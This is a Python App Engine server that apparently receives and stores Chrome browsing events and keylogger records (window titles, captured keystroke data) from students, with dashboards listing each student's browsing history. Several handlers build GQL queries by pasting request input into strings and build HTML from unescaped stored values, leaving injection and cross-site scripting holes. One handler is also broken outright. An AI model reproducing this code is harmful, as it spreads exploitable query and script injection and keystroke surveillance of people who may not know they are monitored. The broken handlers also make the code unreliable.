import sys
import cgi
import urllib

from google.appengine.api import users
from google.appengine.ext import ndb

import webapp2
import datetime
import jinja2
import os
import json
import datetime

# Setting up the Jinja environment to include html pages as templates
JINJA_ENVIRONMENT = jinja2.Environment(
    loader=jinja2.FileSystemLoader(os.path.dirname(__file__)),
    extensions=['jinja2.ext.autoescape'],
    autoescape=True)

## Define a key for chrome Entity
NAME = "chrome_data"
def browser_key(browser_name = NAME):
    return ndb.Key('Browser',browser_name)

## Define email, eventType, urlLink, data and timeStamp as properties of Chrome Entity.
class Chrome(ndb.Model):
    # Email id is a key
    email = ndb.StringProperty(indexed = True)
    eventType = ndb.StringProperty(indexed = False)
    urlLink = ndb.StringProperty(indexed = True)
    datas = ndb.StringProperty(indexed = False)
    timeStamp = ndb.StringProperty(indexed = True)

## Getting chrome data and storing in the database.
class ChromeData(webapp2.RequestHandler):
    def post(self):
        mail = self.request.get("email")
        event_type = self.request.get("eventType")
        url_link = self.request.get("urlLink")
        datass = self.request.get("datas")
        date = self.request.get("timeStamp")
        if mail is not None:
            browser = self.request.get('browser_name',NAME)
            data = Chrome(parent = browser_key(browser))
            data.email = mail
            data.eventType = event_type
            data.urlLink = url_link
            data.datas = datass
            data.timeStamp = date
            data.put()
        else:
            self.response.write('no')
        self.response.write('Success...')

# defining the key for PyKeyLogger entity
def pyKeyLogger_key(logger_name = "pyKey"):
    return ndb.Key('PyKey',logger_name)

## Define userName, loggeduser, windowtitle, datas and timeStamp as properties of
## PyKeyLogger Entity.
class PyKeyLogger(ndb.Model):
    userName = ndb.StringProperty(indexed = True)
    loggeduser = ndb.StringProperty(indexed = False)
    windowtitle = ndb.StringProperty(indexed = False)
    datas = ndb.StringProperty(indexed = False)
    timeStamp = ndb.StringProperty(indexed = False)

class KeyData(webapp2.RequestHandler):
    def post(self):   
        username = self.request.get("user")
        loggeUser = self.request.get("logged")
        title = self.request.get("title")
        datass = self.request.get("datas")
        date = self.request.get("start")
        if username is not None:
            keylogger = self.request.get('logger_name',"pyKey")
            data = PyKeyLogger(parent = pyKeyLogger_key(keylogger))
            data.userName = username
            data.loggeduser = loggeUser
            data.windowtitle = title
            data.datas = datass
            data.timeStamp = date
            data.put()
        else:
            self.response.write('no')
        self.response.write('Responding...')
class MainPage(webapp2.RequestHandler):
    def get(self):
        #self.response.write('Hello world!')
        template_values = {}
        template = JINJA_ENVIRONMENT.get_template('home.html')
        self.response.write(template.render(template_values))

class getPyData(webapp2.RequestHandler):
    def post(self):
        username = self.request.get("user")
        pykeydata = self.request.get('logger_name',"pyKey")
        qry = PyKeyLogger.query(ancestor = pyKeyLogger_key(pykeydata))
        data_query = qry.filter(PyKeyLogger.userName == username)
        dataa = data_query.fetch()
        global result
        result = []
        for row in dataa:
            result.append(row)
        chrome_data= {}
        chrome_data['data'] = result
        self.response.write(result[0])

class getChrome(webapp2.RequestHandler):
    def get(self):
        template_values = {}
        template = JINJA_ENVIRONMENT.get_template('sample.html')
        self.response.write(template.render(template_values))

HTML = """\
<html>
  <body>
    <div>
        <table>
            <tr><th>TimeStamp</th><th>eventType</th><th>url</th><th>data</th></tr>
        
"""
class GetMail(webapp2.RequestHandler):
    def post(self):
        mail = self.request.get("email")
##        chromedata = self.request.get('browser_name',"chrome_data")
##        qry = Chrome.query(ancestor = browser_key(chromedata))
##        data_query = qry.filter(Chrome.email == mail)
##        dataa = data_query.fetch()

        d = str(datetime.date.today())
        dt = d[-2:]+'/'+d[5:7]+'/'+d[:4]+' 00:00:00'

        qry = "SELECT * FROM Chrome WHERE email='"+mail+"' AND timeStamp>'"+dt+"'"## ORDER BY timeStamp DESC"
        data_query = ndb.gql(qry)
        data = data_query.fetch()
            
        global result
        result = []
        global HTML
        HTML = """\
        <html>
          <body border=\"1\" style=\"width:100%\">
            <div>
            <table>
            <tr><th>TimeStamp</th><th>eventType</th><th>url</th><th>data</th></tr>
        
        """
        global count
        count = 0
        for row in data:
            temp = {}
            temp['evenType'] = row.eventType
            temp['urlLink'] = row.urlLink
            temp['datas'] = row.datas
            temp['timeStamp'] = row.timeStamp
            temp['email'] = row.email
            result.append(temp)
            count = count + 1
            HTML = HTML+"<tr><td>"+row.timeStamp+"</td><td>"+row.eventType+"</td><td>"+row.urlLink+"</td><td>"+row.datas+"</td></tr>"
            if count > 2000:
                break
        HTML = HTML+"</table></div></body></html>"
        chrome_data= {'data':result}
        self.response.write(HTML)
        #self.response.write(mail)
class GetUsers(webapp2.RequestHandler):
    def post(self):
        try:
            chromedata = self.request.get('browser_name',"chrome_data")
 ##           qry = Chrome.query(ancestor = browser_key(chromedata))
##            data_query = qry.filter(projection = ['email'], distinct = True)
##            dataa = qry.fetch()
            qry = "SELECT DISTINCT email FROM Chrome"
            data_query = ndb.gql(qry)
            data = data_query.fetch()
            global resu
            resu = []
            for row in data:
                if row.email not in resu and '@' in row.email:
                    resu.append(row.email)
            user_list = {'users':resu}
            self.response.write(json.dumps(user_list))
        except Exception , e:
            self.response.write(str(e))
class DashBoard(webapp2.RequestHandler):
    def get(self):
        global html
        html = """\
        <html>
          <body border=\"1\" style=\"width:100%\"><h1>List of Students</h1>
            <div>
            <table>
            <tr><th>Sl No</th><th>Student Email</th></tr>
        
        """
        try:
            qry = "SELECT DISTINCT email FROM Chrome"
            data_query = ndb.gql(qry)
            data = data_query.fetch()
            global resu
            resu = []
            count = 1
            for row in data:
                if row.email not in resu and '@' in row.email:
                    resu.append(row.email)
                    html = html + "<tr><td>"+str(count)+"</td><td>"+row.email+"</td></tr>"
                    count = count+1
            user_list = {'users':resu}
            html = html+"</table></div></body></html>"
            self.response.write(html)
        except Exception ,e:
            self.response.write(str(e))
      
##    def student_data():
##        qry = "SELECT DISTINCT urllink from Chrome WHERE email = "
##        data_query = ndb.gql(qry)
##        data = data_query.fetch()
        
class GetUserData(webapp2.RequestHandler):
    def post(self):
        mail = self.request.get("email")
        chromedata = self.request.get('browser_name',"chrome_data")
        qry = Chrome.query(ancestor = browser_key(chromedata))
        data_query = qry.filter(Chrome.email == mail)
        dataa = data_query.fetch()
        global result
        result = []
        for row in dataa:
            temp = {}
            temp['evenType'] = row.eventType
            temp['urlLink'] = row.urlLink
            temp['datas'] = row.datas
            temp['timeStamp'] = row.timeStamp
            temp['email'] = row.email
            result.append(temp)
        chrome_data= {'data':result}
        #self.response.write(HTML)
        self.response.write(json.dumps(chrome_data))
class MetaData(webapp2.RequestHandler):
    def get(self):
        self.response.write('working')
## Define a key for Chapter Entity
def chapter_key(intermediate_key = "chapter_key"):
    return ndb.Key('Chapter',intermediate_key)

## class for timings
class Timings(ndb.Model):
    timings = ndb.StringProperty(indexed = False)
## class for users
class Users(ndb.Model):
    user_mail = ndb.StringProperty(indexed = True)
    count = ndb.IntegerProperty(indexed = False)
    timings = ndb.StructuredProperty(Timings)
## class for url
class UrlLink(ndb.Model):
    url = ndb.StringProperty(indexed = True)
    title = ndb.StringProperty(indexed = False)
    users = ndb.StructuredProperty(Users)
## class for Chapter
class Chapter(ndb.Model):
    chapter = ndb.StringProperty(indexed = True)
    module = ndb.StructuredProperty(UrlLink)
## class for generating intermediate table
class Intermediate(webapp2.RequestHandler):
    def post(self):
        username = self.request.get("user")
        loggeUser = self.request.get("logged")
        title = self.request.get("title")
        datass = self.request.get("datas")
        date = self.request.get("start")
def metaData_key(meta_name = "meta"):
    return ndb.Key("Meta",meta_name)
## Model for metaData
class Meta(ndb.Model):
    chapter = ndb.StringProperty(indexed = True)
    url = ndb.StringProperty(indexed = True)
    title = ndb.StringProperty(indexed = False)
    type = ndb.StringProperty(indexed = False)
    qtype = ndb.StringProperty(indexed = False)
    duration = ndb.StringProperty(indexed = False)
## class for storing metadata
class StoreMeta(webapp2.RequestHandler):
    def post(self):
        chap = "3"
        uRl = self.request.get("url")
        tiTle = self.request.get("title")
        tyPe = self.request.get("type")
        duRation = self.request.get("duration")
        quizType = self.request.get("qtype")
        if uRl is not None :
            meta = self.request.get('meta_name',"meta")
            data = Meta(parent = metaData_key(meta))
            data.chapter = chap
            data.url = uRl
            data.title = tiTle
            data.type = tyPe
            data.qtype = quizType
            data.duration = duRation
            data.put()
            self.response.write("success")
        else:
            self.response.write("failed")
## model for student database
def student_key(student = "student"):
    return ndb.Key("StudentData",student)
## model for url
class Url(ndb.Model):
    url = ndb.StringProperty(indexed = True)
    count = ndb.IntegerProperty(indexed = False)
    ts = ndb.StructuredProperty(Timings)
## model for student
class Student(ndb.Model):
    name = ndb.StringProperty(indexed = True)
    uRl = ndb.StructuredProperty(Url)
## storing student data
class GetAllUrls(webapp2.RequestHandler):
    def get(self):
        try:
            qry = "SELECT DISTINCT url FROM Meta"
            data_query = ndb.gql(qry)
            data = data_query.fetch()
##            users_qry = "SELECT DISTINCT email FROM Chrome"
##            users_data_query = ndb.gql(users_qry)
##            users_data = users_data_query.fetch()
##            for uRl in data:
##                for user in users_data:
##                    stu_qry = "SELECT DISTINCT timeStamp FROM Chrome WHERE email='"+user.email+"' AND urlLink='"+uRl.url+"'"
##                    stu_data_query = ndb.gql(stu_qry)
##                    stu_data = stu_data_query.fetch()
            global htmll
            htmll = """\
            <html>
              <body border=\"1\" style=\"width:100%\"><h1>URL Access History</h1>
                <div>
                <table>
                <tr><th>Sl No</th><th>URL</th><th>Count</th></tr>
        
            """
            global c
            c = 1
            for uRl in data:
                link = uRl.url
                count_qry = "SELECT timeStamp FROM Chrome WHERE urlLink='"+link+"'"
                count_query = ndb.gql(count_qry)
                count_data = count_query.fetch()
                global count
                count = 0
                for row in count_data:
                    count = count+1
                htmll = htmll+"<tr><td>"+c+"</td><td>"+link+"</td><td>"+count+"</td></tr>"
                c = c+1
####            
####            count = 1
####            for row in data:
####                if row.email not in resu and '@' in row.email:
####                    resu.append(row.email)
####                    html = html + "<tr><td>"+str(count)+"</td><td>"+row.email+"</td></tr>"
####                    count = count+1
####            user_list = {'users':resu}
            html = html+"</table></div></body></html>"
            self.response.write(html)
        except Exception ,e:
            self.response.write(str(e))

## Get Url Data
class GetUrlData(webapp2.RequestHandler):
    def get(self):
        chromedata = self.request.get('browser_name',"chrome_data")
        qry = Chrome.query(ancestor = browser_key(chromedata))
        #data_query = qry.filter(Chrome.email == "anveshika.09@gmail.com")
        dataa = qry.fetch()
        result = {}
        count = 0
        for row in dataa:
            count = count + 1
            if count > 1000:
                break
            if (result.has_key(row.urlLink)):
                result[row.urlLink][0] = result[row.urlLink][0] + 1
                result[row.urlLink][1].append(row.email)
                result[row.urlLink][1] = list(set(result[row.urlLink][1]))
            else:
                result[row.urlLink] = [1,[row.email]]
        global HTML
        HTML = """\
        <html>
          <body border=\"1\" style=\"width:100%\">
            <div>
            <table>
            <tr><th>URL</th><th>Count</th><th>Students</th></tr>
        
        """
        for url in result:        
            HTML = HTML+"<tr><td>"+url+"</td><td>"+str(result[url][0])+"</td><td>"+''.join(result[url][1])+"</td</tr>"
        HTML = HTML+"</table></div></body></html>"
        chrome_data= {'data':result}
        self.response.write(HTML)
        #self.response.write(mail)
app = webapp2.WSGIApplication([
    ('/', MainPage),
    ('/chrome',ChromeData),
    ('/keydata',KeyData),
    ('/getpydata',getPyData),
    ('/getchromedata',getChrome),
    ('/getMail',GetMail),
    ('/getusers',GetUsers),
    ('/getuserdata',GetUserData),
    ('/savemetadata',MetaData),
    ('/storemeta',StoreMeta),
    ('/dashboard',DashBoard),
    ('/geturldata',GetUrlData),
    ('/geturls',GetAllUrls),
], debug=True)
